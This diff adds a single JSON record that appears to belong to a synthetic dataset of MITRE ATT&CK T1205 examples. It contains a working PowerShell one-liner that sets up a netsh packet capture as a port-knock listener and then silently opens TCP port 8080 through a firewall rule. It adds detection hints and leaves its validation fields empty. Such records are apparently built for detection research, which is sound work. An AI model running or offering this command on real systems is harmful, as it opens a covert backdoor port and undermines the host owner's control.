@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh trace start capture=yes traceFile='C:\\ProgramData\\svclogs\\knock.etl' persistent=no maxsize=50 filemode=single correlation=no keywords=ut:TcpIp level=5 scenario=InternetClient capturetype=circular Ethernet.Type=IPv4 IPv4.UDP.Port=49000;Start-Job -ScriptBlock { $f='C:\\ProgramData\\svclogs\\knock.etl'; while(-not (Test-Path $f)){Start-Sleep 1}; $baseline=0; while($true){$len=(Get-Item $f).Length; if($len -gt ($baseline+4096)){ & netsh advfirewall firewall add rule name='Knock-Open-8080' dir=in action=allow protocol=TCP localport=8080; break }; $baseline=$len; Start-Sleep 1}}|Out-Null",
+  "explanation": "Begins a filtered netsh packet capture focused on UDP/49000 (a knock port). A background job watches for capture growth that indicates inbound knocks and then opens TCP/8080 via netsh. Requires elevation for netsh trace and firewall rule changes.",
+  "rationale_steps": [
+    "Start a netsh trace limited to suspected knock traffic to minimize noise.",
+    "Use file growth as a crude signal of received knocks, then open a hidden service port.",
+    "Detection: monitor for netsh trace sessions (ETW providers enabled), captures written to atypical paths, and new firewall rules exposing non-standard service ports."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-8a2701af",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
